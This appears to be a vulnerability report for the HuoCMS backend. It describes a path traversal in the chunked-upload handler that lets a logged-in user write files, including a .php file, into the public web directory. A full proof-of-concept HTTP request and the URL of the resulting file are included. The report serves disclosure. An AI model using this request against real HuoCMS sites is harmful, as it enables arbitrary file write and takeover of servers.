Source Code Address:  https://gitee.com/digital-flag/huocms

In the sliceUploadAndSave method of AttachmentController.php (located under app -> controller -> backend), the resource_type parameter is validated against a whitelist of allowed file extensions (e.g., txt, png, etc.). Subsequently, the method invokes tmpMove from Upload.php (under app -> service -> upload).

The tmpMove method first creates a file. However, the $filename parameter (controlled by the resource_temp_path input parameter, which is user-controllable) can be exploited to traverse directories (e.g., using ../) to create folders. The method then performs a move operation, placing the file into the created directory. The final filename is generated by appending an underscore and the $pos suffix, where $pos is controlled via the chunk_index parameter passed during the call (refer to the actual parameter passing for details).

This creates a vulnerability where an attacker could manipulate resource_temp_path and chunk_index to write files to arbitrary locations with controlled filenames.



This vulnerability is a backend issue that requires logging into the backend with a token to invoke. Please set up and log in by yourself.

POC：
```
POST /attachment/sliceUploadAndSave HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: token
Content-Type: multipart/form-data; boundary=----geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Length: 990
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

------geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Disposition: form-data; name="resource_chunk"; filename="blob"
Content-Type: application/octet-stream

1
------geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Disposition: form-data; name="chunk_total"

1
------geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Disposition: form-data; name="chunk_index"

.php
------geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Disposition: form-data; name="resource_temp_basename"

.php
------geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Disposition: form-data; name="resource_temp_path"

../../../public/storage/image/20250415/
------geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Disposition: form-data; name="resource_type"

txt
------geckoformboundary13d3934e0299a09e8748d146bfb9d483
Content-Disposition: form-data; name="resource_name"

11.png
------geckoformboundary13d3934e0299a09e8748d146bfb9d483--
```

![image](https://github.com/user-attachments/assets/b670c180-df77-4e0d-9e13-7e02c7e8308e)


Access URL:  
http://127.0.0.1/storage/image/20250415/%5f.php
![image](https://github.com/user-attachments/assets/7acae885-a38c-40ea-9413-e1fe26272ce2)




